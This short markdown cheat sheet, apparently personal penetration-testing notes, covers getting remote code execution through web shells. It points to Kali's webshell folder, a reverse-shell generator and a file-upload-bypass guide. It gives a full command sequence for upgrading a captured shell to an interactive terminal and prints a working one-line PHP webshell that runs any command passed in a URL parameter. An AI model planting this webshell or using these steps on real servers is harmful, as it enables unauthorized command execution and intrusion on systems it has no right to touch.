## Intro
Who doesn't like the RCE on demand?

List webshells available on Kali
```
tree /usr/share/webshells/
```

## Revshells
Great reverse shell generator

https://www.revshells.com/

**PHP PentestMonkey** works great!

## File Upload bypass
If website blocks upload of your webshell, try this

https://book.hacktricks.xyz/pentesting-web/file-upload

## Upgrade shell
When shell works, but does not support all features
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
<CTRL+Z>
stty -echo raw
fg
stty rows 41 columns 166
```

## Apache
Basic PHP webshell
```
# Take input from the URL paramter. e.g http://<IP>/shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>
```
